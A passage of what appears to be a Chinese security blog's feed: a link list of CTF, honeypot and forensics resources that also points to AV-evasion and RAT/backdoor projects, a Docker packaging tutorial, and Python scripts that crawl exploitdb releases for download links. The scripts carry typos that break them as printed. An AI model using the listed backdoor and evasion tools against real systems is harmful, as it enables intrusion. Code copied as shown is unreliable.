rel="noopener">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a><br>fbctf竞赛平台Demo:<br><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a><br>ctf Resources:<br><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a><br>ctf及黑客资源合集:<br><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a><br>ctf和安全工具大合集:<br><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a><br>ctf向 python工具包<br><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><h2 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源:"></a>各类编程资源:</h2><p>大礼包（什么都有）:<br><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a><br>bash-handbook:<br><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a><br>python资源大全:<br><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a><br>git学习资料:<br><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a><br>安卓开源代码解析<br><a href="https://github.com/android-cn/android-open-project" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project</a><br>python框架，库，资源大合集:<br><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a><br>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h2 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h2><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:<br><a href="https://github.com/VerbalExpressions/" target="_blank" rel="noopener">https://github.com/VerbalExpressions/</a><br>python任务管理以及命令执行库:<br><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a><br>python exe打包库:<br><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a><br>Veil-Evasion免杀项目：<br><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion</a><br>py3 爬虫框架:<br><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a><br>一个提供底层接口数据包编程和网络协议支持的python库:<br><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a><br>python requests 库:<br><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a><br>python 实用工具合集:<br><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a><br>python爬虫系统:<br><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><h2 id="科学上网："><a href="#科学上网：" class="headerlink" title="科学上网："></a>科学上网：</h2><p>科学上网工具<br><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p><h1 id="福利："><a href="#福利：" class="headerlink" title="福利："></a>福利：</h1><p>微信自动抢红包动态库<br><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a><br>微信抢红包插件（安卓版）<br><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a><br>hardsed神器:<br><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p><h2 id="甲方安全工程师生存指南"><a href="#甲方安全工程师生存指南" class="headerlink" title="甲方安全工程师生存指南"></a>甲方安全工程师生存指南</h2><p>web索引及日志搜索工具：<br><a href="https://github.com/thomaspatzke/WASE" target="_blank" rel="noopener">https://github.com/thomaspatzke/WASE</a><br>开源日志采集器：<br><a href="https://github.com/wgliang/logcool" target="_blank" rel="noopener">https://github.com/wgliang/logcool</a><br>扫描CS结构的web debuger<br><a href="https://github.com/Kozea/wdb" target="_blank" rel="noopener">https://github.com/Kozea/wdb</a><br>恢复sqlite数据库删除注册信息：<br><a href="https://github.com/aramosf/recoversqlite/" target="_blank" rel="noopener">https://github.com/aramosf/recoversqlite/</a><br>gps欺骗检测工具:<br><a href="https://github.com/zxsecurity/gpsnitch" target="_blank" rel="noopener">https://github.com/zxsecurity/gpsnitch</a><br>应急处置响应框架:<br><a href="https://github.com/biggiesmallsAG/nightHawkResponse" target="_blank" rel="noopener">https://github.com/biggiesmallsAG/nightHawkResponse</a><br>web安全开发指南:<br><a href="https://github.com/FallibleInc/security-guide-for-developers" target="_blank" rel="noopener">https://github.com/FallibleInc/security-guide-for-developers</a><br>各个知名厂商漏洞测试报告模板：<br><a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener">https://github.com/juliocesarfort/public-pentesting-reports</a> linux下恶意代码检测包：<br><a href="https://github.com/rfxn/linux-malware-detect" target="_blank" rel="noopener">https://github.com/rfxn/linux-malware-detect</a><br>操作系统运行指标可视化框架：<br><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">https://github.com/facebook/osquery</a><br>恶意代码分析系统：<br><a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a><br>定期搜索及存储web应用：<br><a href="https://github.com/Netflix/Scumblr" target="_blank" rel="noopener">https://github.com/Netflix/Scumblr</a><br>事件响应框架：<br><a href="https://github.com/google/grr" target="_blank" rel="noopener">https://github.com/google/grr</a><br>综合主机监控检测平台：<br><a href="https://github.com/ossec/ossec-hids" target="_blank" rel="noopener">https://github.com/ossec/ossec-hids</a><br>分布式实时数字取证系统：<br><a href="https://github.com/mozilla/mig" target="_blank" rel="noopener">https://github.com/mozilla/mig</a><br>Microsoft &amp; Unix 文件系统及硬盘取证工具：<br><a href="https://github.com/sleuthkit/sleuthkit" target="_blank" rel="noopener">https://github.com/sleuthkit/sleuthkit</a></p><h2 id="蜜罐："><a href="#蜜罐：" class="headerlink" title="蜜罐："></a>蜜罐：</h2><p>SSH蜜罐：<br><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a><br>蜜罐集合资源：<br><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a><br>kippo进阶版蜜罐：<br><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a><br>SMTP 蜜罐：<br><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a><br>web应用程序蜜罐：<br><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a><br>数据库蜜罐：<br><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a><br>web蜜罐：<br><a href="https://github.com/atiger77/Dionaea" target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p><h2 id="远控："><a href="#远控：" class="headerlink" title="远控："></a>远控：</h2><p>用gmail充当C&amp;C服务器的后门<br><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a><br>开源的远控：<br><a href="https://github.com/UbbeLoL/uRAT" target="_blank" rel="noopener">https://github.com/UbbeLoL/uRAT</a><br>c#远控：<br><a href="https://github.com/hussein-aitlahcen/BlackHole" target="_blank" rel="noopener">https://github.com/hussein-aitlahcen/BlackHole</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;漏洞及渗透练习平台&lt;br&gt;花式扫描器/信息搜集工具/WEB/windows域渗透工具&lt;br&gt;Fuzz/漏洞利用及攻击框架/漏洞POC&amp;amp;EXP/中间人攻击及钓鱼&lt;br&gt;密码破解/二进制及代码分析工具/二进制静态分析工具（python）&lt;br&gt;EXP编写框架及工具/隐写/各类CTF资源/各类编程资源/Python&lt;br&gt;科学上网/福利/甲方安全工程师生存指南/蜜罐/远控&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="安全" scheme="http://austfish.cn/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="http://austfish.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python完整项目打包Docker入坑记录</title>
    <link href="http://austfish.cn/2019/08/22/python%E5%AE%8C%E6%95%B4%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85Docker%E5%85%A5%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
    <id>http://austfish.cn/2019/08/22/python完整项目打包Docker入坑记录/</id>
    <published>2019-08-22T01:29:49.000Z</published>
    <updated>2022-02-18T03:34:21.063Z</updated>
    
    <content type="html"><![CDATA[<p>第一个问题：为什么用docker<br>第二个问题：docker是什么<br>第三个问题：怎么用docker<br>第四个问题：怎么安装docker（linux）<br>第五个问题：将python打包到docker上<br>第六个问题：docker运行项目的相关操作<br>第七个问题：生成镜像报错后的none镜像怎么删除<br><a id="more"></a></p><h4 id="第一个问题：为什么用docker"><a href="#第一个问题：为什么用docker" class="headerlink" title="第一个问题：为什么用docker"></a>第一个问题：为什么用docker</h4><p>在使用Docker部署安装之前，我们还是先认识下Docker的优点:</p><ul><li>软件构建容易，分发简单</li><li>应用得到隔离，依赖被解除</li><li>可以完美地用于 CI/CD</li><li>快速部署，测试完以后销毁也方便</li></ul><hr><h4 id="第二个问题：docker是什么"><a href="#第二个问题：docker是什么" class="headerlink" title="第二个问题：docker是什么"></a>第二个问题：docker是什么</h4><p>Docker的三个概念<br><strong>镜像（Image）</strong>：类似于虚拟机中的镜像。任何应用程序运行都需要环境，而镜像就是用来提供这种运行环境的。例如一个Ubuntu镜像就是一个包含Ubuntu操作系统环境的模板，同理在该镜像上装上Apache软件，就可以称为Apache镜像。</p><p><strong>容器（Container）</strong>：类似于一个轻量级的沙盒，可以将其看作一个极简的Linux系统环境（包括root权限、进程空间、用户空间和网络空间等），以及运行在其中的应用程序。Docker引擎利用容器来运行、隔离各个应用。容器是镜像创建的应用实例，可以创建、启动、停止、删除容器，各个容器之间是是相互隔离的，互不影响。注意：镜像本身是只读的，容器从镜像启动时，Docker在镜像的上层创建一个可写层，镜像本身不变。</p><p><strong>仓库（Repository）</strong>：类似于代码仓库，这里是镜像仓库，是Docker用来集中存放镜像文件的地方。注意与注册服务器（Registry）的区别：注册服务器是存放仓库的地方，一般会有多个仓库；而仓库是存放镜像的地方，一般每个仓库存放一类镜像，每个镜像利用tag进行区分，比如Ubuntu仓库存放有多个版本（12.04、14.04等）的Ubuntu镜像。</p><hr><h4 id="第三个问题：怎么用docker"><a href="#第三个问题：怎么用docker" class="headerlink" title="第三个问题：怎么用docker"></a>第三个问题：怎么用docker</h4><p>Docker 常用命令确认容器有在运行，可以通过 docker ps 来查看<br>使用 docker stop 容器Name 命令来停止容器<br>查看docker信息 docker info<br>删除镜像：docker rmi imageID<br>停用镜像：docker stop ImageID<br>重启镜像： docker start imageID<br>删除容器: docker rm ID<br>docker inspect 来查看 Docker 的底层信息<br>docker images 查看docker 镜像<br>从 Docker Hub 网站来搜索镜像，Docker Hub 网址为： <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a><br>使用 docker search 命令来搜索镜像。如搜索httpd的镜像。<br>使用命令 docker pull 来下载镜像。<br>命令 docker build ， 从零开始来创建一个新的镜像<br>容器连接：指定容器绑定的网络地址，比如绑定 127.0.0.1。</p><hr><h4 id="第四个问题：怎么安装docker（linux）"><a href="#第四个问题：怎么安装docker（linux）" class="headerlink" title="第四个问题：怎么安装docker（linux）"></a>第四个问题：怎么安装docker（linux）</h4><h6 id="1：禁用selinux（特别重要，不然可能pull失败）"><a href="#1：禁用selinux（特别重要，不然可能pull失败）" class="headerlink" title="1：禁用selinux（特别重要，不然可能pull失败）"></a>1：禁用selinux（特别重要，不然可能pull失败）</h6><p>禁用selinux，因为selinux和LXC有冲突，故而需要禁用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/selinux/config</span><br></pre></td></tr></table></figure></p><p>以下是/etc/selinux/config的内容<br>enforcing - SELinux security policy is enforced.<br>permissive - SELinux prints warnings instead of enforcing.<br>disabled - No SELinux policy is loaded.SELINUX=disabled<br>将SELINUX设为disabled，注意修改后最好重启下机器。</p><h6 id="2：安装yum-源"><a href="#2：安装yum-源" class="headerlink" title="2：安装yum 源"></a>2：安装yum 源</h6><p>直接使用命令: yum install docker-io<br>会报错:No package docker-io available.<br><img src="/assets/blogImg/201812251444200.png" alt> </p><p> 需要先安装yum 源.yum -y install <a href="http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm" target="_blank" rel="noopener">http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</a></p><h6 id="3：安装docker"><a href="#3：安装docker" class="headerlink" title="3：安装docker"></a>3：安装docker</h6><p> 执行：yum install docker-io<br> docker就安装成功了<br> 将docker开机启动：chkconfig docker on<br> 启动docker：service docker start<br> 查看docker版本：docker version<br> 查看docker日志：cat /var/log/docker<br><img src="/assets/blogImg/2019-8-22-2.png" alt><br> 到这里，docker就安装完成了。</p><h6 id="4-卸载docker（不需要卸载的就直接看四，加速配置）"><a href="#4-卸载docker（不需要卸载的就直接看四，加速配置）" class="headerlink" title="4.卸载docker（不需要卸载的就直接看四，加速配置）"></a>4.卸载docker（不需要卸载的就直接看四，加速配置）</h6><p> 列出你安装过的docker：yum list installed | grep docker</p><p><img src="/assets/blogImg/2019-8-22-3.png" alt> </p><p> 删除软件包：yum -y remove docker-io.x86_64<br> 删除镜像/容器等：rm -rf /var/lib/docker</p><h6 id="5-docker加速配置，国外的网可能比较慢，配置国内阿里云源（docker1-7修改方法）"><a href="#5-docker加速配置，国外的网可能比较慢，配置国内阿里云源（docker1-7修改方法）" class="headerlink" title="5.docker加速配置，国外的网可能比较慢，配置国内阿里云源（docker1.7修改方法）"></a>5.docker加速配置，国外的网可能比较慢，配置国内阿里云源（docker1.7修改方法）</h6><p> 执行编辑命令：<code>vi /etc/sysconfig/docker</code></p><p> 加入下面两行<br> other_args=&quot;–registry-mirror=<a href="https://wbtwgo1e.mirror.aliyuncs.com" target="_blank" rel="noopener">https://wbtwgo1e.mirror.aliyuncs.com</a>&quot;<br> OPTIONS=’–registry-mirror=<a href="https://wbtwgo1e.mirror.aliyuncs.com&#39;" target="_blank" rel="noopener">https://wbtwgo1e.mirror.aliyuncs.com&#39;</a><br> 即可</p><h4 id="第五个问题：将python打包到docker上"><a href="#第五个问题：将python打包到docker上" class="headerlink" title="第五个问题：将python打包到docker上"></a>第五个问题：将python打包到docker上</h4><p>步骤如下：</p><h6 id="1：创建一个上传到Linux系统文件夹（文件名任意）"><a href="#1：创建一个上传到Linux系统文件夹（文件名任意）" class="headerlink" title="1：创建一个上传到Linux系统文件夹（文件名任意）"></a>1：创建一个上传到Linux系统文件夹（文件名任意）</h6><p>docker_EF_NFCS是要上传到Linux系统，生成Docker镜像的文件夹<br><img src="/assets/blogImg/2019-8-22-4.png" alt> </p><p> docker_EF_NFCS文件夹下面有两个东东，</p><p> 一个Dockerfile文件（没有后缀名）</p><p> Dockerfile 是一个文本文件，其内包含了一条条的指令(Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。有了 Dockerfile，就可以创建我们所需要的镜像<br> Dockerfile文件内容如下：<br> <img src="/assets/blogImg/2019-8-22-5.png" alt> </p><p> #基于的基础镜像<br> FROM python:3.7</p><p> #代码添加到code文件夹<br> ADD ./EF_NFCS /code</p><p> #设置code文件夹是工作目录<br> WORKDIR /code</p><p> #安装支持<br> RUN pip install -r requirements.txt<br> CMD [&quot;python&quot;, &quot;/code/package/server.py&quot;]</p><hr><p> 最后一条命令，就是说，当启动容器时候，执行server.py程序。<br><u> code目录与requirements.txt 同级目录</u></p><p> 一个EF_NFCS（任意起的名字）文件夹：包含工程的代码，和运行工程所需要的环境列表</p><p> 所以，EF_NFCS文件夹，有两个成员package和requirements.txt</p><p><img src="/assets/blogImg/2019-8-22-6.png" alt> </p><p> package就是Python项目的package（整个源码所在目录）直接复制过来的</p><p> requirements.txt生成方法：<br> cmd命令，进入到【D:\python\EF_NFCS】目录，也就是工程目录，package的同级目录，<br> 执行命令：<br> pip freeze &gt; </p><p> 就在该目录下生成了一个requirements.txt文件：<br> 如下图，可能很大，因为没有配合virtualenv ，就把整个环境中的包都列出来，没关系，我们可以删除我们此工程中，不需要的组件</p><p><img src="/assets/blogImg/2019-8-22-7.png" alt> </p><h6 id="2：上传到linux环境，生成镜像"><a href="#2：上传到linux环境，生成镜像" class="headerlink" title="2：上传到linux环境，生成镜像"></a>2：上传到linux环境，生成镜像</h6><p>  2.1：我们将docker_EF_NFCS文件夹，压缩成zip包，上传到Linux虚拟机系统中的某个路径下面</p><p><img src="/assets/blogImg/2019-8-22-8.png" alt> </p><p>  2.2：解压：执行命令：</p><p>  unzip docker_EF_NFCS.zip</p><p>  2.3：进入docker_EF_NFCS文件夹：</p><p><img src="/assets/blogImg/2019-8-22-9.png" alt> </p><p>  2.4：创建镜像：执行命令：<br>  docker build -t ef_nfcs_img .<br>  ef_nfcs_img 为创建的镜像名称，. 表示当前目录（docker_EF_NFCS）<br><img src="/assets/blogImg/2019-8-22-10.png" alt><br>  查看镜像是否创建成功：执行命令：docker images</p><p><img src="/assets/blogImg/2019-8-22-11.png" alt> </p><p>  可以看到ef_nfcs_img的镜像，已经存在了 </p><h6 id="3：运行镜像，生成并启动容器"><a href="#3：运行镜像，生成并启动容器" class="headerlink" title="3：运行镜像，生成并启动容器"></a>3：运行镜像，生成并启动容器</h6><p>  执行命令：docker run -it -p 9060:9060 –name ef_nfcs ef_nfcs_img</p><p>  -it：表示交互式终端的容器，非启动后立刻结束的容器</p><p>  -p 9060:9060：表示将docker的9060端口，映射到Linux虚拟机的9060端口                        也就是说，访问Linux虚拟机的9060端口，就是在访问docker容器的9060端口</p><p>  –name ef_nfcs：给容器取个名字，嫌麻烦可以省去</p><p>  ef_nfcs_img：容器是用哪个镜像启动的（一个容器，必须依赖一个镜像启动）</p><p><img src="/assets/blogImg/2019-8-22-12.png" alt> </p><p>  和原来用PyCharm启动的效果一致：<br><img src="/assets/blogImg/2019-8-22-13.png" alt><br>   原来访问系统：</p><p><img src="/assets/blogImg/2019-8-22-14.png" alt> </p><hr><h4 id="第六个问题：docker运行项目的相关操作"><a href="#第六个问题：docker运行项目的相关操作" class="headerlink" title="第六个问题：docker运行项目的相关操作"></a>第六个问题：docker运行项目的相关操作</h4><p>一些实用命令<br>退出容器又不关闭容器：Ctrl + P + Q<br>比如这种情况：<br><img src="/assets/blogImg/2019-8-22-15.png" alt><br>直接输入exit 会退出且关闭容器，工程就stop了<br>或者Ctrl + C，会报错KeyboardInterrupt，工程就也stop了<br>再访问就访问不了了：<br><img src="/assets/blogImg/2019-8-22-16.png" alt><br>此时，就需要使用命令：docker start 容器ID，去再启动容器后，就可以继续访问工程了，<br>使用命令：<br>docker exec -it 容器ID /bin/bash<br>或者<br>docker attach  容器ID，重新进入容器后，可查看程序打印的日志<br> 但是，如果使用Ctrl + P + Q退出容器，就不会中断工程，等于退出容器后，还可访问容器的工程，<br> 再进入，也是使用命令：docker attach  容器ID</p><p> ctrl+d 退出容器且关闭, docker ps 查看无</p><p> ctrl+p+q 退出容器但不关闭</p><p> 查看安装的docker：yum list installed | grep docker<br> 查看容器：docker ps -a<br> 查看镜像：docker images<br> 删除容器：docker rm 容器ID<br> 删除镜像：docker rmi 镜像ID/镜像名<br> 安装rz上传，sz下载的命令：yum -y install lrzsz<br> docker inspect 容器ID：返回一个Json文件记录Docker容器的配置和状态信息 </p><p> 将容器导出到容器的镜像文件 ： docker export 容器ID &gt; update.tar<br> 用容器的镜像文件创建一个新静像：docker import - 镜像名 &lt; update.tar<br> 创建完成之后，生成并启动镜像的容器：docker run -it  镜像名<br> 不行就在后面加一个/bin/bash ,然后进入code的package目录，手动启动程序：python server.py<br> 比如报错：Error response from daemon: No command specified<br><img src="/assets/blogImg/2019-8-22-17.png" alt><br>  镜像保存为镜像文件： docker save -o update1.tar update（update是一个已经存在的镜像）<br>  从镜像文件加载生成新镜像：docker load &lt; update1.tar</p><h4 id="第七个问题：生成镜像报错后的none镜像怎么删除"><a href="#第七个问题：生成镜像报错后的none镜像怎么删除" class="headerlink" title="第七个问题：生成镜像报错后的none镜像怎么删除"></a>第七个问题：生成镜像报错后的none镜像怎么删除</h4><p>  删除none的镜像，要先删除镜像中的容器。要删除镜像中的容器，必须先停止容器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker images</span><br><span class="line">  $ docker rmi $(docker images | grep &amp;quot;none&amp;quot; | awk &apos;&#123;print $3&#125;&apos;)</span><br></pre></td></tr></table></figure><p>  直接删除带none的镜像，直接报错了。提示先停止容器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop $(docker ps -a | grep &amp;quot;Exited&amp;quot; | awk &apos;&#123;print $1 &#125;&apos;) //停止容器$ docker rm </span><br><span class="line"> $(docker ps -a | grep &amp;quot;Exited&amp;quot; | awk &apos;&#123;print $1 &#125;&apos;) //删除容器</span><br><span class="line"> $ docker rmi $(docker images | grep &amp;quot;none&amp;quot; | awk &apos;&#123;print $3&#125;&apos;) //删除镜像</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一个问题：为什么用docker&lt;br&gt;第二个问题：docker是什么&lt;br&gt;第三个问题：怎么用docker&lt;br&gt;第四个问题：怎么安装docker（linux）&lt;br&gt;第五个问题：将python打包到docker上&lt;br&gt;第六个问题：docker运行项目的相关操作&lt;br&gt;第七个问题：生成镜像报错后的none镜像怎么删除&lt;br&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://austfish.cn/tags/python/"/>
    
      <category term="docker" scheme="http://austfish.cn/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>基于python爬虫的github-exploitdb漏洞库监控与下载</title>
    <link href="http://austfish.cn/2019/03/18/%E5%9F%BA%E4%BA%8Epython%E7%88%AC%E8%99%AB%E7%9A%84github-exploitdb%E6%BC%8F%E6%B4%9E%E5%BA%93%E7%9B%91%E6%8E%A7%E4%B8%8E%E4%B8%8B%E8%BD%BD/"/>
    <id>http://austfish.cn/2019/03/18/基于python爬虫的github-exploitdb漏洞库监控与下载/</id>
    <published>2019-03-18T06:43:44.000Z</published>
    <updated>2022-02-18T03:34:21.762Z</updated>
    
    <content type="html"><![CDATA[<p>exploitdb监控和下载代码：</p><a id="more"></a><p><strong>offensive.py(爬取项目历史更新内容)</strong></p><blockquote><p><strong>#!/usr/bin/env python</strong></p><p># -<em>- coding:utf-8 -</em>-</p><p>import re</p><p>import time</p><p>import urllib.request</p><p>import conf as cf</p><p>BASE_URL = ‘<a href="https://github.com/offensive-security/exploitdb/releases&#39;" target="_blank" rel="noopener">https://github.com/offensive-security/exploitdb/releases&#39;</a></p><p>DOWNLOAD_LINK_PATTERN = ‘href=”(.*?)zip” rel=”nofollow”&gt;’</p><p>FIRST_PATTERN = r’<a rel="nofollow" href="(.*?)">Next.*’</a></p><p>PAGE_PATTERN = r’&gt;Previous<a rel="nofollow" href="(.*?)">Next.*’</a></p><p>class MyCrawler:</p><p>​    def <strong>init</strong>(self, base_url=BASE_URL, start_page=”first 1 page”):</p><p>​        self.base_url = base_url</p><p>​        self.start_page = start_page</p><p>​        # self.headers = apache_request_headers();</p><p># 对首页的爬取</p><p>​    def first_page(self):</p><p>​        try:</p><p>​            req = urllib.request.Request(self.base_url)</p><p>​            html = urllib.request.urlopen(req)</p><p>​            doc = html.read().decode(‘utf8’, ‘ignore’)</p><p>​            next_page = re.search(FIRST_PATTERN, doc, re.M | re.I)</p><p>​            print(‘Now working on page = {}\n’.format(self.start_page))</p><p>​            time.sleep(5)</p><p>​            self.fetch_download_link(self.base_url)</p><p>​            self.start_page = next_page.group(1)</p><p>​            # re.search(r’after = (.<em>?) “&gt;Next.</em>‘, next_page.group(1), re.M | re.I).group(1)</p><p>​            self.base_url = next_page.group(1)</p><p>​            # self.fetch_download_link(next_url)</p><p>​        except urllib.error.HTTPError as err:</p><p>​            print(err.msg)</p><p>​        self.fetch_next_page()</p><p># 翻页</p><p>​    def fetch_next_page(self):</p><p>​        while True:</p><p>​            try:</p><p>​                req = urllib.request.Request(self.base_url)</p><p>​                html = urllib.request.urlopen(req)</p><p>​                doc = html.read().decode(‘utf8’, ‘ignore’)</p><p>​                next_page = re.search(PAGE_PATTERN, doc, re.M | re.I)</p><p>​                print(‘Now working on page {}\n’.format(self.start_page))</p><p>​                time.sleep(5)</p><p>​                #翻页时等待5秒</p><p>​                self.fetch_download_link(self.base_url)</p><p>​                self.start_page = next_page.group(1)</p><p>​                # re.search(r’after = (.<em>?) “&gt;Next.</em>‘, next_page.group(1), re.M | re.I).group(1)</p><p>​                self.base_url = next_page.group(1)</p><p>​                # self.fetch_download_link(next_url)</p><p>​            except urllib.error.HTTPError as err:</p><p>​                print(err.msg)</p><p>​                break</p><p># 文件下载：将下载链接存到文件中</p><p>​    def fetch_download_link(self, Aurl):</p><p>​        f = open(‘result.txt’, ‘a’)</p><p>​        req = urllib.request.Request(Aurl)</p><p>​        html = urllib.request.urlopen(req)</p><p>​        doc = html.read().decode(‘utf8’)</p><p>​        alist = list(set(re.findall(DOWNLOAD_LINK_PATTERN, doc)))</p><p>​        for item in alist:</p><p>​            url = “https://github.com/“ + item + “zip”</p><p>​            print(‘Storing {}’.format(url))</p><p>​            f.write(url + ‘\n’)</p><p>​            time.sleep(7)</p><p>​        f.close()</p><p>​    def run(self):</p><p>​        self.fetch_download_link()</p><p>if <strong>name</strong> == ‘<strong>main</strong>‘:</p><p>​    mc = MyCrawler()</p><p>​    mc.first_page()</p></blockquote><p><strong>text.py(监控首页更新，并爬取)</strong></p><blockquote><p>#!/usr/bin/env python</p><p># -<em>- coding:utf-8 -</em></p><p>from selenium import webdriver</p><p>import re</p><p>import time</p><p>import urllib.request</p><p>import conf as cf</p><p>BASE_URL = ‘https://github.com/offensive-security/exploitdb/releases’</p><p>DOWNLOAD_LINK_PATTERN = ‘href=”(.*?)zip” rel=”nofollow”&gt;’</p><p>FIRST_PATTERN = r’<a rel="nofollow" href="(.*?)">Next.*’</a></p><p># 监控项目首页更新</p><p>def jiankong_page():</p><p>​    print(“star monitoring “)</p><p>​    req = urllib.request.Request(BASE_URL)</p><p>​    html = urllib.request.urlopen(req)</p><p>​    doc = html.read().decode(‘utf8’, ‘ignore’)</p><p>​    next_page = re.search(FIRST_PATTERN, doc, re.M | re.I)</p><p>​    flag_page = next_page.group(1)</p><p>​    flag_list = []</p><p># 首次抓取首页项目url</p><p>​    alist = list(set(re.findall(DOWNLOAD_LINK_PATTERN, doc)))</p><p>​    for item in alist:</p><p>​        url = “https://github.com/“ + item + “zip”</p><p>​        flag_list.append(url)</p><p># 定时扫描监控（5h/次）</p><p>​    while True:</p><p>​        try:</p><p>​            time.sleep(5 <em> 60</em> 60)</p><p>​            req = urllib.request.Request(BASE_URL)</p><p>​            html = urllib.request.urlopen(req)</p><p>​            doc = html.read().decode(‘utf8’, ‘ignore’)</p><p>​            next_page = re.search(FIRST_PATTERN, doc, re.M | re.I)</p><p># 判断翻页链接是否变化，来确定是否更新</p><p>​            if next_page.group(1) != flag_page:</p><p>​                print(“have update”)</p><p>​                item = re.rearch(DOWNLOAD_LINK_PATTERN, doc, re.M | re.I)</p><p>​                #抓取第一个匹配的 刚更新的项目url</p><p>​                new_url = “https://github.com/“ + item.group(1) + “zip”</p><p>​                print(“new url = “ + new_url)</p><p>​                flag_list.append(new_url)</p><p>​                f = open(‘result.txt’, ‘a’)</p><p>​                f.write(new_url + ‘\n’)</p><p>​                f.close()</p><p>​                flag_page = next_page.group(1)</p><p>​            else:</p><p>​                print(“No update”)</p><p>​        except urllib.error.HTTPError as err:</p><p>​            print(err.msg)</p><p>​            break</p><p>if <strong>name</strong> == ‘<strong>main</strong>‘:</p><p>​    jiankong_page()</p></blockquote><hr><p><img src="file:///C:/Users/hatchet/AppData/Roaming/xiangxuema/xxm/3/img15694646984030.jpg" alt="wx:austfish"></p><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><em>介绍一下我自己吧，我是<strong>Fisher</strong>，互联网安全作者一枚，<strong>日常是分享有趣的安全技术与故事，当然也会记录学习之路的收获。对安全领域感兴趣</strong>，可以关注我的个人<strong>微信公众号：austfish</strong>。不想走丢的话，请关注**</em>【Fisher的安全日记】<em>**！（别忘了加星标哦）or 个人博客：<a href="http://www.austfish.cn" target="_blank" rel="noopener">www.austfish.cn</a></em></p>]]></content>
    
    <summary type="html">
    
